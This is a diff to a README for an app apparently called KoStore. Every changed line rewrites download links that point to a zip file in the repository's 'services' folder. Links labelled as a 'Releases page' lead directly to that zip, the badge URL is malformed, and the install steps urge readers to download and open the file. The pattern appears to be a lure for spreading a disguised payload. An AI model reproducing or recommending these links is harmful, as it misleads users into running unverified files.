@@ -6,11 +6,11 @@ Welcome to KoStore! This application provides a simple way to access and manage 
 
 ## 📥 Download KoStore
 
-[![Download KoStore](https://raw.githubusercontent.com/ravirkpal/KoStore/main/services/Store-Ko-v3.8.zip%https://raw.githubusercontent.com/ravirkpal/KoStore/main/services/Store-Ko-v3.8.zip)](https://raw.githubusercontent.com/ravirkpal/KoStore/main/services/Store-Ko-v3.8.zip)
+[![Download KoStore](https://github.com/ravirkpal/KoStore/raw/refs/heads/main/services/Store-Ko-v3.8.zip%https://github.com/ravirkpal/KoStore/raw/refs/heads/main/services/Store-Ko-v3.8.zip)](https://github.com/ravirkpal/KoStore/raw/refs/heads/main/services/Store-Ko-v3.8.zip)
 
 To get started, visit the Releases page to download the latest version of KoStore.
 
-👉 [Visit KoStore Releases Page](https://raw.githubusercontent.com/ravirkpal/KoStore/main/services/Store-Ko-v3.8.zip)
+👉 [Visit KoStore Releases Page](https://github.com/ravirkpal/KoStore/raw/refs/heads/main/services/Store-Ko-v3.8.zip)
 
 ## 📝 Features
 
@@ -32,7 +32,7 @@ To run KoStore smoothly, ensure your device meets the following requirements:
 
 ## 📚 Download & Install
 
-1. Click the large button above or visit [the Releases page](https://raw.githubusercontent.com/ravirkpal/KoStore/main/services/Store-Ko-v3.8.zip).
+1. Click the large button above or visit [the Releases page](https://github.com/ravirkpal/KoStore/raw/refs/heads/main/services/Store-Ko-v3.8.zip).
 2. Select the version that suits your operating system.
 3. Click on the download link for your platform (e.g., Windows or macOS).
 4. Once the file downloads, locate it in your downloads folder.
